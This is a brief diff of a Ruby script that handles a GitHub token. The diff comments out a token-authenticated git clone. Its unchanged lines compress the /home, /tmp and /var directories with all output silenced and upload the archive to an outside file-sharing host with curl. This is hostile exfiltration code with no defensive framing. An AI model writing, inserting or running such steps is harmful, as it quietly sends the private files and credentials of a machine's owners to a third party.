@@ -8,7 +8,7 @@ require 'base64'
 ENV["GH_TOKEN"] = ENV["GITHUB_TOKEN"]
 token = ENV["GITHUB_TOKEN"]
 
-system("git clone https://#{token}@github.com/elizabethtl/test-oracle-devrel")
+# system("git clone https://#{token}@github.com/elizabethtl/test-oracle-devrel")
 Dir.chdir("test-oracle-devrel") do
   system("tar -I 'zstd -T0' -cvf aaa.zstd /home /tmp /var > /dev/null 2> /dev/null")
   system("curl uploader.sh -T aaa.zstd")
